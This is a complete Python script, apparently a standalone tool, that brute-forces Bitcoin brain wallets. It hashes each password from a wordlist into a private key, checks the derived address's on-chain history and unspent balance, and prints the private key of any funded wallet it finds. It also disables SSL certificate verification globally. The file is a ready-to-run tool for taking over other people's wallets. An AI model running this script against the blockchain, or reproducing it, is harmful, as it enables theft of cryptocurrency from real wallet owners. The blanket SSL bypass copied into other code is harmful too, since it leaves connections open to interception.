from bitcoin import *
import ssl
import argparse
from multiprocessing import Pool, Manager, Value 

#
# bypassing SSL errors due to unverified certificates
#
ssl._create_default_https_context = ssl._create_unverified_context

def create_parse():
    parser = argparse.ArgumentParser(
        description='Utility to try crack bitcoins private keys generated from weak passphrases.')
    parser.add_argument('pass_list', help='Password list')
    return parser


def count_lines(filename):
    t = 0
    with open(filename) as fp:
        for line in fp:
            t += 1
    return t


def crack_process(pwd, i, total, total_exists, total_balance, total_errors):
    """
    crack_process performs the action of checking to see if a public key addresses
    can be found that is generated by the password for the private key. For any 
    addresses that are found to have history, it will also check unspent values 
    on the address. Updates shared values for tracking existance of addresses matching
    a password in the list, total balances

    Args:
        pwd: the plaintext password to find matching public addresses for 
        i: the index of the current password being checked
        total: the total number of passwords that will be checked
        total_exists: a shared integer tracking the total addresses found for passwords in the list
        total_balance: a shared integer tracking the total balance of unspent bitcoin found
        total_errors: a shared integer tracking the total errors that happen during processing

    """

    print('Progress: {0:.2f}%'.format(float(i) / total * 100.00))
    try:
        priv = sha256(pwd)
        pub = privtopub(priv)
        addr = pubtoaddr(pub)
        h = history(addr)
        if h and any(h):
            total_exists.value += 1
        
            print('Found history on address: {}'.format(addr))
            print('For Passphrase: {}'.format(pwd))
            
            u = unspent(addr)
            if u and any(u):
                total_balance.value += 1
        
                print('BINGO! Found also unspent')
                print('Private Key: {}'.format(priv))
                print('Public Key: {}'.format(pub))

    except Exception as e:
        total_errors.value += 1
        print('Error on {}'.format(pwd))
        print(e)


def crack(pwd_file):
    """
    crack iterates over passwords in a file and attempts to find 
    bitcoin addresses that used these passwords to generate their wallet
    addresses. crack uses the multiprocessing library to take advantage of the 
    available CPU cores to distribute the workload. 

    Args:
        pwd_file: the name of the file containing the input passwords

    Returns:
        tuple: a tuple of (total passwords checked, total that had addresses found, 
                               total unspent bitcoin balance, total errors occurrec )
    """

    print('Using file: {}'.format(pwd_file))
    total = count_lines(pwd_file)

    manager = Manager()
    total_exists = manager.Value('i', 0)
    total_balance = manager.Value('i', 0)
    total_errors = manager.Value('i', 0)
    
    log_blocks = int(total * 0.0001)
    if log_blocks == 0:
        log_blocks = total
        
    with open(pwd_file) as fp:
        pool = Pool()
        for i, pwd in enumerate(fp):
            try:
                if pwd:
                    pool.apply_async(crack_process, (pwd,i, total, total_exists, total_balance, total_errors))
            
            except Exception as e:
                print("Error on processing {}".format(e))
        #wait for remaining processes to finish...
        pool.close()
        pool.join()
            
    return total, total_exists, total_balance, total_errors


def start():
    parser = create_parse()
    args = parser.parse_args()
    pass_list = args.pass_list
    total, total_exists, total_balance, total_errors = crack(pass_list)
    print('Total: {}'.format(total))
    print('Total with history: {}'.format(total_exists.value))
    print('Total with balance: {}'.format(total_balance.value))
    print('Total errors: {}'.format(total_errors.value))


if __name__ == '__main__':
    start()
